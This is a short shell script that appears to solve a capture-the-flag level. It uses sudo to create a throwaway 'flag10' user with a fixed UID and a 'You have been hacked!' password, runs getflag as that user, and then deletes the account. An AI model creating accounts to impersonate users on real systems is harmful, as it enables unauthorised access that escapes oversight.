#!/bin/sh -eu

sudo useradd \
  --no-create-home \
  --no-user-group \
  --password '💀 You have been hacked! 💀' \
  --uid 3010 \
  flag10
echo -n 'flag10: '
sudo -u flag10 getflag | egrep -o '[^ ]+$'
sudo userdel flag10
